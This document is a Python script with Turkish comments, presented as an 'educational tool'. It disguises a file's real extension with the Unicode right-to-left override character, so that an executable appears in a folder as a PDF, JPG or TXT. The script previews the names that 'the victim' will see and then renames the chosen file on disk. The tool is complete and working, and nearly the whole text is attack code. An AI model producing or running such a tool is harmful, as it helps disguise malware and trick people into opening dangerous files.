import os
import tkinter as tk
from tkinter import filedialog
import unicodedata

# Bu özel karakter metin yönünü tersine çevirir (Right-to-Left Override)
RTLO_CHAR = "\u202e"

def sanitize_filename(name: str, allow_rtlo: bool = False) -> str:
    """
    Dosya adını temizler. Ancak allow_rtlo True ise
    RTLO karakterine dokunmaz (Eğitim amaçlı gösterim için).
    """
    cleaned = ""
    for ch in name:
        if allow_rtlo and ch == RTLO_CHAR:
            cleaned += ch
            continue
        if unicodedata.category(ch)[0] != "C":
            cleaned += ch
    return cleaned

def create_spoofed_extension(original_name: str, fake_extension: str):
    """
    Gerçek uzantıyı saklayıp, sahte bir uzantı gibi görünmesini sağlar.
    """
    base, real_ext = os.path.splitext(original_name)
    real_ext_clean = real_ext.replace(".", "")
    fake_ext_reversed = fake_extension[::-1]
    
    # Dosya sistemi için gerçek isim (Unicode içerir)
    spoofed_name = f"{base}{RTLO_CHAR}{fake_ext_reversed}{real_ext}"
    return spoofed_name

def simulate_visual_name(base: str, real_ext: str, fake_ext: str) -> str:
    """
    RTLO uygulandıktan sonra insan gözünün Windows'ta göreceği hali simüle eder.
    Mantık: Base + (GerçekUzantı) + . + (SahteUzantı)
    """
    clean_real = real_ext.replace(".", "")
    # Windows'ta RTLO sonrası karakterler ters dizildiği için
    # exe + . + pdf gibi görünür.
    return f"{base}{clean_real}.{fake_ext}"

def main():
    root = tk.Tk()
    root.withdraw()

    print("--- DOSYA UZANTISI GİZLEME (RTLO) EĞİTİM ARACI ---")
    print("Lütfen üzerinde çalışacağınız dosyayı seçin...")
    
    file_path = filedialog.askopenfilename(title="Bir dosya seçin")
    if not file_path:
        print("Dosya seçilmedi.")
        return

    directory, original_name = os.path.split(file_path)
    base, real_ext = os.path.splitext(original_name)
    
    print(f"\nSeçilen Dosya: {original_name}")
    print(f"Gerçek Uzantı: {real_ext}")

    print("\n--- Hileli İsimlendirme ve Görünüm Örnekleri ---")
    print("(Not: 'Sistem Adı' dosyaya verilecek gerçek addır, 'Görünecek Olan' ise kurbanın göreceği addır)")
    
    # Senaryo 1: PDF
    spoof_pdf = create_spoofed_extension(original_name, "pdf")
    visual_pdf = simulate_visual_name(base, real_ext, "pdf")
    print(f"\n1. Seçenek (PDF):")
    print(f"   Sistem Adı (Gizli): {spoof_pdf}")
    print(f"   --> GÖRÜNECEK OLAN: {visual_pdf}")

    # Senaryo 2: JPG
    spoof_jpg = create_spoofed_extension(original_name, "jpg")
    visual_jpg = simulate_visual_name(base, real_ext, "jpg")
    print(f"\n2. Seçenek (JPG):")
    print(f"   Sistem Adı (Gizli): {spoof_jpg}")
    print(f"   --> GÖRÜNECEK OLAN: {visual_jpg}")

    # Senaryo 3: TXT
    spoof_txt = create_spoofed_extension(original_name, "txt")
    visual_txt = simulate_visual_name(base, real_ext, "txt")
    print(f"\n3. Seçenek (TXT):")
    print(f"   Sistem Adı (Gizli): {spoof_txt}")
    print(f"   --> GÖRÜNECEK OLAN: {visual_txt}")

    print("\n------------------------------------------------")
    choice = input("Hangi sahte uzantıyı uygulamak istersiniz? (pdf/jpg/png/txt yazın): ").strip().lower()

    if choice in ["iptal", "exit", ""]:
        return

    # Seçilen sahte uzantıya göre yeni isim oluştur
    new_name = create_spoofed_extension(original_name, choice)
    new_name = sanitize_filename(new_name, allow_rtlo=True)
    
    # Seçilenin önizlemesini tekrar gösterelim
    final_visual = simulate_visual_name(base, real_ext, choice)

    new_path = os.path.join(directory, new_name)

    print(f"\nSEÇİLEN İŞLEM:")
    print(f"Gerçek (Tehlikeli) Dosya Adı: {new_name.encode('utf-8')}")
    print(f"Kurbanın Klasörde Göreceği  : {final_visual}") 
    
    confirm = input("\nDosya adını bu şekilde değiştirmek istiyor musunuz? (e/h): ")
    if confirm.lower() == 'e':
        try:
            os.rename(file_path, new_path)
            print("\nBAŞARILI! Dosya yeniden adlandırıldı.")
            print(f"Klasöre baktığınızda dosya '{final_visual}' gibi görünecek.")
        except Exception as e:
            print("Hata oluştu:", e)
    else:
        print("İşlem iptal edildi.")

if __name__ == "__main__":
    main()
